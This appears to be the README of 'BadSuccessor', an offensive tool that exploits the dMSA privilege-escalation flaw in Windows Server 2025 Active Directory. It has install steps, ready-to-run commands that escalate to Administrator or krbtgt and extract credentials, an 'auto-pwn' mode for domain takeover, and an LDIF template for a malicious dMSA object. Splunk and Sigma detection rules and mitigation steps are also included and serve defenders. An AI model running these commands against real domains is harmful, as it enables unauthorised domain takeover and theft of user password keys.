# BadSuccessor

A penetration testing tool that exploits the dMSA (delegated Managed Service Account) privilege escalation vulnerability in Windows Server 2025 Active Directory environments.

## ⚠️ Legal Disclaimer

**This tool is for authorized penetration testing and security research purposes only.** Use of this tool against systems without explicit written permission is illegal and unethical. The authors are not responsible for any misuse or damage caused by this tool.

## 🚨 Important Notice

**Users are reporting mixed results with this tool. Use at your own risk.** The tool's effectiveness depends on specific Windows Server 2025 schema implementations which may vary between environments.

## 📋 Overview

BadSuccessor exploits a privilege escalation vulnerability in Windows Server 2025's delegated Managed Service Account (dMSA) feature. The vulnerability allows attackers with minimal permissions to escalate privileges to any user in the domain, including Domain Administrators.

### Research Credit

This tool is based on the excellent research by **Yuval Gordon** from **Akamai Technologies**:
- [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)

## 🎯 Vulnerability Details

The vulnerability exists in the dMSA migration process where:
1. An attacker creates a malicious dMSA in any writable OU
2. Sets `msDS-ManagedAccountPrecededByLink` or `ms-DS-Managed-Account-Preceded-By-Link` to point to a target user
3. Sets `msDS-DelegatedMSAState` or `ms-DS-Delegated-MSA-State` to `2` (migration completed)
4. The KDC automatically grants the dMSA all privileges of the target user via PAC inheritance

Additionally, the KERB-DMSA-KEY-PACKAGE structure contains the target user's password keys, enabling credential extraction.

## ✅ Prerequisites

### System Requirements
- Linux machine (non-domain joined)
- Python 3.6+
- Network access to target Active Directory environment
- Target domain must have at least one Windows Server 2025 Domain Controller

### Python Dependencies
```bash
pip3 install ldap3 pyasn1 pycryptodome
pip3 install impacket==0.12.0
```

**Note**: The tool has been tested with impacket 0.12.0. Other versions may have compatibility issues.

### Optional Dependencies
```bash
# For DNS discovery
pip3 install dnspython

# For enhanced Kerberos support (system packages)
# Ubuntu/Debian
sudo apt-get install libkrb5-dev libgssapi-krb5-2

# RHEL/CentOS/Fedora
sudo yum install krb5-devel
```

### Required Permissions
- Valid domain credentials (any user account)
- **ANY** of the following permissions on at least one Organizational Unit:
  - `CreateChild` permission
  - `Write` permission
  - `GenericWrite` permission
  - `GenericAll` permission
  - Member of default groups with write access (e.g., Authenticated Users)
- Tool automatically discovers all writable OUs and shows specific permissions

## 🚀 Installation

```bash
git clone https://github.com/cybrly/badsuccessor.git
cd badsuccessor
pip3 install -r requirements.txt
chmod +x badsuccessor.py
```

### requirements.txt
```
ldap3>=2.9.1
pyasn1>=0.4.8
pycryptodome>=3.15.0
impacket==0.12.0
dnspython>=2.1.0
```

## 📖 Usage

### Basic Syntax
```bash
python3 badsuccessor.py -d <domain> -u <username> -p <password> [options]
```

### Quick Start Examples

#### 1. Enumerate Environment
```bash
# Check Windows Server 2025 schema support
python3 badsuccessor.py -d corp.local -u john -p Password123 --check-schema

# Find ALL writable OUs (not just CreateChild)
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate

# List high-value targets
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-targets
```

#### 2. Perform Attack
```bash
# Basic attack against Administrator
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator

# Attack with specific DC IP
python3 badsuccessor.py -d corp.local -u john -p Password123 --dc-ip 192.168.1.10 --attack --target Administrator

# Attack with specific OU
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator --ou-dn "OU=ServiceAccounts,DC=corp,DC=local"

# Attack with custom dMSA name
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target krbtgt --dmsa-name legit_service
```

#### 3. Extract Credentials
```bash
# Extract credentials for multiple users
python3 badsuccessor.py -d corp.local -u john -p Password123 --extract-creds --targets Administrator,krbtgt,svc_sql

# Auto-pwn mode (fully automated)
python3 badsuccessor.py -d corp.local -u john -p Password123 --auto-pwn
```

### Command Line Options

| Option | Description |
|--------|-------------|
| `-d, --domain` | Target domain (e.g., corp.local) **[REQUIRED]** |
| `-u, --username` | Username for authentication **[REQUIRED]** |
| `-p, --password` | Password for authentication |
| `--dc-ip` | Domain Controller IP (auto-discover if omitted) |
| `--ldaps` | Force LDAPS (SSL) connection on port 636 |
| `--attack` | Perform the BadSuccessor attack |
| `--target` | Target user to escalate privileges to |
| `--dmsa-name` | Name for malicious dMSA (auto-generated if not specified) |
| `--ou-dn` | Specific OU DN to use (auto-detect if not specified) |
| `--extract-creds` | Extract credentials using key package |
| `--targets` | Comma-separated list of users for credential extraction |
| `--auto-pwn` | Fully automated domain takeover |
| `--enumerate` | Enumerate OUs with ANY write permissions |
| `--list-targets` | List high-value targets |
| `--check-schema` | Verify Windows Server 2025 schema |
| `--cleanup` | Remove created dMSA |
| `--dmsa-dn` | dMSA DN for cleanup operations |
| `--no-banner` | Suppress banner output |
| `--verbose` | Enable verbose output |

## 🔧 Attack Workflow

### Phase 1: Reconnaissance
1. **Schema Verification**: Confirms Windows Server 2025 dMSA support
2. **Permission Discovery**: Identifies OUs with ANY write access (not just CreateChild)
3. **Target Enumeration**: Lists privileged accounts and service accounts

### Phase 2: Exploitation
1. **dMSA Creation**: Creates malicious dMSA with proper object classes
2. **Attribute Manipulation**: Sets predecessor link and migration state
3. **Privilege Inheritance**: dMSA inherits target's complete PAC

### Phase 3: Authentication
1. **Kerberos TGT Request**: Obtains TGT with inherited privileges
2. **PAC Analysis**: Verifies inherited group memberships
3. **Key Package Extraction**: Retrieves target's password hashes

### Phase 4: Post-Exploitation
The tool provides ready-to-use commands for:
- DCSync attacks (dump all domain hashes)
- Remote command execution
- Lateral movement
- Persistence establishment

## 🔐 Enhanced Features (v2.2.0)

### Schema Attribute Flexibility
- **NEW**: Supports both attribute naming conventions:
  - Classic: `msDS-ManagedAccountPrecededByLink`
  - Hyphenated: `ms-DS-Managed-Account-Preceded-By-Link`
- Automatically detects which format your environment uses
- Compatible with various Windows Server 2025 implementations

### Import Compatibility
- **FIXED**: Resolved impacket import issues
- **FIXED**: Removed dependency on `seq_decode` and other problematic imports
- **IMPROVED**: Better compatibility with impacket 0.12.0

### Comprehensive Permission Checking
- Checks for ALL write permissions, not just CreateChild
- Detects permissions from default groups (Authenticated Users, Everyone, etc.)
- Evaluates actual permissions on OUs including:
  - CreateChild
  - Write
  - GenericWrite
  - GenericAll
  - FullControl
- Shows exact permissions for each discovered OU

### Default Group Support
- Automatically includes default group memberships in permission checks
- Handles permissions granted to:
  - Authenticated Users (S-1-5-11)
  - Everyone (S-1-1-0)
  - Domain Users
  - Network
  - Interactive
  - This Organization

### Complete Implementation
- All features fully implemented (no placeholder code)
- Proper error handling throughout
- More informative output and logging

## 🛡️ Detection

### Event IDs to Monitor
| Event ID | Source | Description |
|----------|--------|-------------|
| **5137** | Security | Directory service object creation (dMSA) |
| **5136** | Security | Directory service object modification |
| **2946** | Directory Service | Group Managed Service Account authentication |
| **4768** | Security | Kerberos TGT requested |
| **4769** | Security | Kerberos service ticket requested |

### Detection Rules
```
# Splunk Query Example
index=windows EventCode=5137
| where ObjectClass="msDS-DelegatedManagedServiceAccount" OR ObjectClass="ms-DS-Delegated-Managed-Service-Account"
| where NOT user IN ("approved_admins")

# Sigma Rule Example
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName:
      - 'msDS-ManagedAccountPrecededByLink'
      - 'ms-DS-Managed-Account-Preceded-By-Link'
  condition: selection
```

### Behavioral Indicators
- Rapid creation and deletion of service accounts
- Non-administrative users creating dMSAs
- Unusual modifications to migration-related attributes
- Service accounts authenticating from unexpected sources

## 🔒 Mitigation

### Immediate Actions
1. **Restrict OU Permissions**
   ```powershell
   # Remove ALL write permissions from non-admin users
   Remove-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" -User "Domain Users" -AccessRights CreateChild,Write,GenericWrite,GenericAll

   # Check for default group permissions
   Get-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" | Where-Object {$_.IdentityReference -match "Authenticated Users|Everyone"}
   ```

2. **Monitor dMSA Operations**
   ```powershell
   # Enable auditing on dMSA attributes (both naming conventions)
   Set-ADObject -Identity "CN=Schema,CN=Configuration,DC=corp,DC=local" -Add @{
     'msDS-ReplAttributeMetaData' = @('msDS-ManagedAccountPrecededByLink', 'ms-DS-Managed-Account-Preceded-By-Link')
   }
   ```

3. **Implement Detection**
   - Deploy provided detection rules
   - Alert on Event ID 2946 with S-1-5-7 caller
   - Monitor attribute modifications

### Long-term Solutions
- Apply Microsoft patches when available
- Regular permission audits (check ALL write permissions, not just CreateChild)
- Principle of least privilege enforcement
- Consider disabling dMSA if not required

## 📊 Statistics

Based on Akamai's research:
- **91%** of environments have vulnerable permissions
- Works on **default configurations**
- Affects organizations with Windows Server 2025 DCs
- No patches currently available

## 🏗️ Technical Implementation Details

### dMSA Object Structure
```ldif
dn: CN=evil_dmsa,OU=ServiceAccounts,DC=corp,DC=local
objectClass: top
objectClass: msDS-GroupManagedServiceAccount
objectClass: msDS-DelegatedManagedServiceAccount
sAMAccountName: evil_dmsa$
userAccountControl: 4096
# Note: Your environment may use either format below
msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=corp,DC=local
# OR
ms-DS-Managed-Account-Preceded-By-Link: CN=Administrator,CN=Users,DC=corp,DC=local
msDS-DelegatedMSAState: 2
msDS-SupportedEncryptionTypes: 28
```

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/enhancement`)
3. Commit changes (`git commit -m 'Add new feature'`)
4. Push to branch (`git push origin feature/enhancement`)
5. Submit a Pull Request

### Development Guidelines
- Follow PEP 8 style guide
- Add unit tests for new features
- Update documentation
- Test against multiple AD environments
- Test with different schema attribute naming conventions

## 📝 Changelog

### v2.2.0 (2025-05-27) - Compatibility Update
- **FIXED**: Resolved impacket import issues (removed seq_decode dependency)
- **FIXED**: Compatible with impacket 0.12.0
- **FEATURE**: Added support for both dMSA attribute naming conventions
- **IMPROVED**: Better error handling for import failures
- **IMPROVED**: More robust schema detection

### v2.1.0 (2025-05-25) - Complete Implementation
- **MAJOR**: Enhanced ACL permission checking - now detects ALL write permissions
- **MAJOR**: Added support for default groups (Authenticated Users, Everyone, etc.)
- **FIXED**: Removed all placeholder code
- **FIXED**: Complete implementation of all features
- **IMPROVED**: Better error handling and informative output
- **IMPROVED**: More comprehensive OU enumeration (includes containers)
- **FEATURE**: Shows exact permissions for each discovered OU
- **FEATURE**: Detects protected users and delegation restrictions

### v2.0.0 (2025-05-24) - Enhanced Edition
- **Major**: Full Kerberos authentication implementation
- **Major**: KERB-DMSA-KEY-PACKAGE extraction for credential theft
- **Major**: Basic ACL permission checking
- **Major**: Windows Server 2025 schema verification
- **Feature**: Mass credential extraction mode
- **Feature**: Auto-pwn for automated domain takeover
- **Feature**: Enhanced target enumeration
- **Feature**: Post-exploitation command generation
- **Improvement**: Better error handling and logging
- **Improvement**: Production-ready code structure

## 📚 References

- [Original Akamai Research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [GitHub Issue #1 - Enhanced Permission Checking](https://github.com/cybrly/badsuccessor/issues/1)
- [GitHub Issue #2 - Schema Attribute Naming](https://github.com/cybrly/badsuccessor/issues/2)

## 🐛 Known Issues

- Mixed results reported by users - effectiveness depends on specific Windows Server 2025 implementation
- Some environments may use different attribute naming conventions
- Hash authentication requires password for initial implementation
- Some environments may require manual Kerberos configuration
- Detection rules need customization per environment

## 🔍 Troubleshooting

### Import Errors
If you encounter import errors with impacket:
```bash
# Ensure you have the correct version
pip3 uninstall impacket
pip3 install impacket==0.12.0
```

### Schema Detection Failures
If schema detection fails, manually verify attribute names:
```powershell
# On Domain Controller
Get-ADObject -Filter {name -like "*delegated*"} -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local" | Select Name
```

### Permission Denied Errors
Ensure your user has at least one of the required permissions:
```bash
# Use --enumerate to check your permissions
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate
```

## 📧 Contact

For questions, issues, or responsible disclosure:
- Open a GitHub Issue
- Follow responsible disclosure practices
- Allow 90 days for patch development

---

**⚡ Remember: With great power comes great responsibility. Always obtain proper authorization before testing!** 🔐
